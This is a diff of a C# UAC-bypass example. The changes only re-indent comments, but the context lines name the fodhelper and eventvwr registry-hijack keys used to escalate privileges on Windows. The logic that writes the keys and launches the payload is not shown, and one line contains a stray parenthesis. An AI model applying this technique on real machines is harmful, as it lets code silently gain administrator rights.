@@ -1,11 +1,11 @@
 using System;	
 using System.Runtime.InteropServices;	// to import the libraries
-using Microsoft.Win32;			// for Registry editing
+using Microsoft.Win32;			          // for Registry editing
 using System.Diagnostics;
-using System.IO;			// to check if fodhelper exists in System32
-using System.Security.Principal;	// to check if your application is elevated.
+using System.IO;			                // to check if fodhelper exists in System32
+using System.Security.Principal;	    // to check if your application is elevated.
 using System.Collections.Generic;
-using System.Windows.Forms;		// where the Application class is located, which can be useful for returning the current path of your own application (Application.ExecutablePath).
+using System.Windows.Forms;		        // where the Application class is located, which can be useful for returning the current path of your own application (Application.ExecutablePath).
 
 namespace UACBypassExample
 {
@@ -24,7 +24,7 @@ namespace UACBypassExample
             public string RegPath;
             public string FilePath;
 
-	    // initialize 
+	          // initialize 
             public UACPath(string RegPath, string FilePath)
             {
                  this.RegPath = RegPath;
@@ -36,7 +36,7 @@ namespace UACBypassExample
         {
              List<UACPath> upath = new List<UACPath>
              {
-		  // FODHELPER METHOD: Windows 10 2016 and up.
+		              // FODHELPER METHOD: Windows 10 2016 and up.
                   new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\Shell\\Open\\command", "C:\\Windows\\System32\\fodhelper.exe" ), // 0
                   // EVENTVWR METHOD: Windows versions less than Windows 10
 		  new UACPath( "HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command",     "C:\\Windows\\System32\\eventvwr.exe"  )  // 1
@@ -49,14 +49,14 @@ namespace UACBypassExample
              try
              {
                   // use this if your program is running on 32 bit accessing 64 bit system files.
-		  // it is used to prevent redirection to SysWOW64 when trying to access something
+		              // it is used to prevent redirection to SysWOW64 when trying to access something
                   // on System32 especially if your OS is 64 bit, since both fodhelper and eventvwr
-	          // doesn't even exists there (SysWOW64) somehow.
+	                // doesn't even exists there (SysWOW64) somehow.
                   if (w64) 
                       w64d = Imports.Wow64DisableWow64FsRedirection(out ov))
                   
 
-		  // to get the actual version, you need to embed the manifest with a <supportedOS>
+		              // to get the actual version, you need to embed the manifest with a <supportedOS>
                   // entry. Otherwise Environment.OSVersion might return Windows 8 instead of 10 in newer
                   // Windows versions. That entry is created along with the manifest, you just need to
                   // remove the comment tag or <!-- .. --> within the supportedOS entry.
